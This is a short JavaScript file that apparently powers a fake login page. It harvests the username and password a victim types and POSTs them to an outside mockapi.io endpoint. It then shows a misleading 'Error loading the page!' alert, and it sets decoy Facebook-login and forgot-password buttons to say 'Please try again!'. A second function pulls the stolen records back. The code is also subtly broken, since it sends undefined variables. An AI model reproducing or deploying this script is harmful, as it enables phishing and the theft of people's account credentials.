
function storeCredentials() {
    const username = document.getElementById('user').value;
    const password = document.getElementById('pass').value;

    const data = { 
        username: user,
        password: pass
    };

    if (user && pass) {
        fetch('https://67ee2158c11d5ff4bf78703b.mockapi.io/api/username/userData', {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json',
            },
            body: JSON.stringify(data)
        })
        .then(response => response.json())
        .then(data => {
            console.log('Stored Data:', data);
            alert('Error loading the page!');

            username.value = '';
            password.value = '';
        })
        .catch(error => console.error('Error storing data:', error));
    } else {
        alert('Please provide valid credentials.');
    }
}

function retrieveCredentials() {
    fetch('https://67ee2158c11d5ff4bf78703b.mockapi.io/api/username/userData')
        .then(response => response.json())
        .then(data => {
            console.log('Retrieved Data:', data);
            alert('Data retrieved successfully. Check console for details.');
        })
        .catch(error => console.error('Error fetching data:', error));
}

function handleLogin() {
    storeCredentials();
}

    document.querySelectorAll("#facebook-login").forEach(button => {
        button.addEventListener("click" , (event) => {
            alert("Please try again!")
        })
    })

    document.querySelectorAll("#forgot-password").forEach(button => {
        button.addEventListener("click" , (event) => {
            alert("Please try again!")
        })
    })
